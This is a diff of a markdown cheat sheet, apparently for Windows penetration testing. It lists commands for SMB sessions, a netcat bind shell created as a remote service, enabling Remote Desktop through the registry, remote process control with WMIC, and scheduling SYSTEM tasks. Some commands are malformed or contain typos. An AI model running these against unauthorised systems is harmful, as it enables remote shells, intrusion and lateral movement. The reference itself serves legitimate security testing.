@@ -84,16 +84,16 @@ Establish an SMB session | <code> net use \\[targetIP] [password] /u:[user] </co
 Mount a Share on Target | <code> net use * \\[targetIP]\[share] [password] /u:[user] <br> net use * \\[targetIP]\[share] [password] /u:[MachineName_or_Domain]\[user] </code>
 Dropping SMB Session | <code> "net use \\[targetIP] /del <br> net use * /del" </code>
 Run a Remote Command | <code> sc \\[targetIP] create netcat binpath= "cmd.exe /k c:\tools\nc.exe -L -p cmd.exe </code> 
-Turn on Remote Desktop / terminal services | <code> reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenysconnetions /t reg_dword /d 0 </code>
+Turn on Remote Desktop / terminal services | <code> reg add "hklm\ system\ currentcontrolset\ control\ terminal server" /v fdenysconnetions /t reg_dword /d 0 </code>
 Remote Registry  | <code> Put \\[MachineName] before [KeyName] </code> 
 WMIC Invoke Porgram | <code> wmic /node:[targetIP] /user:[admin_user] /password:[password] process call create [command] </code>
+WMIC on Multiple Machines | <code> /node:@[filename] - run a command on multiple machines listed in a file </code> 
+WMIC Service Query | <code> wmic services where (displayname like "%[whatever]%") get name </code> 
+WMIC List Processes | <code> wmic /node:[targetIP] /user:[admin_user] /password:[password] process list brief </code> 
+WMIC Kill Processes | wmic /node:[targetIP] /user:[admin_user] /password:[password] process where name="[name]" delete or processID="[PID]" delete </code>
+WMIC Monitor Process | <code> wmic process where name="[name]" list brief /every:1 | "nc.exe" </code>
+at (windows 7 and lower)(all commands at SYSTEM) | "net use \\[targetIP] [password] /u:[admin_user] <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> *sc \\[targetIP] start schedule* <br> at [\\targetIP] [HH:MM] [A|P] [command] <br> at \\[machine] [time] cmd /c ""[command]"" <br> at \\[targetIP} (*check status*)" </code> 
 
-Remote Access, SMB, and WMIC | WMIC on Multiple Machines | /node:@[filename] - run a command on multiple machines listed in a file | 
-Remote Access, SMB, and WMIC | WMIC Service Query | wmic services where (displayname like "%[whatever]%") get name | 
-Remote Access, SMB, and WMIC | WMIC List Processes | wmic /node:[targetIP] /user:[admin_user] /password:[password] process list brief | 
-Remote Access, SMB, and WMIC | WMIC Kill Processes | wmic /node:[targetIP] /user:[admin_user] /password:[password] process where name="[name]" delete or processID="[PID]" delete | 
-Remote Access, SMB, and WMIC | WMIC Monitor Process | wmic process where name="[name]" list brief /every:1 | "nc.exe"
-Remote Access, SMB, and WMIC | at (windows 7 and lower)(all commands at SYSTEM) | "net use \\[targetIP] [password] /u:[admin_user] <br> sc \\[targetIP] query schedule (*make sure it is running*) <br> *sc \\[targetIP] start schedule* <br> at [\\targetIP] [HH:MM] [A|P] [command] <br> at \\[machine] [time] cmd /c ""[command]"" <br> at \\[targetIP} (*check status*)" | 
 Remote Access, SMB, and WMIC | schtasksStart TIme - HH:MM:SSFrequency: MINUTE, HOURLY, DAILY, ONCE, ONSTART, ONLOGON, ONIDLE | "> net use \\[targetIP] [password] /u:[admin_user]
 > sc \\[targetIP] query schedule (*make sure it is running*)
 > *sc \\[targetIP] start schedule*
